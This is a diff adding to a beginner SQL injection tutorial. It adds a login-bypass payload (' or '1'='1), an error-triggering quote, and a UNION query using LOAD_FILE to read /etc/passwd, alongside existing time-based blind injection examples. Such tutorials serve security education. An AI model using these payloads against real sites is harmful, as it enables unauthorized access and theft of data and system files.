@@ -1,10 +1,23 @@
 SQL Injection is an injection attack in which attacker attempts to modify ( or inject his own query ) in the website where the website is attempting to get some result from a database.
 
+If you simply want to bypass the login you can enter query in this way : 
+```
+' or '1'='1
+```
+This will always return a true value thus bypassing the login page (if it is vulnerable to it).
+
 There are many types of SQL Injections
 
 #### Error based injection 
 In this type of injection attacker try to put any character which generates an error in the result of query and understand the structure of the query to further exploit it.
 
+You can generate an error by simply putting an single quote ' in the query.
+
+```
+select id from login where username=''' and password='';
+```
+
+This will generate an error in the query.
 
 #### Union based injection
 
@@ -56,4 +69,10 @@ select id from login where user='admin' and (select sleep(2) from dual where dat
 If the database name is 4 character long then there will be a time delay. Now you can ask it questions in such a way that you can get any information from database.
 ```
 select id from login where user='admin' and (select sleep(2) from dual where (select table_name from information_schema.tables where table_schema='login') likee '%users%');-- 
+
+```
+
+##### If you want to include a file then there is LOAD\_FILE('path') function in sql 
+```
+select id from login where username='' union select LOAD_FILE('/etc/passwd');-- 
 ```
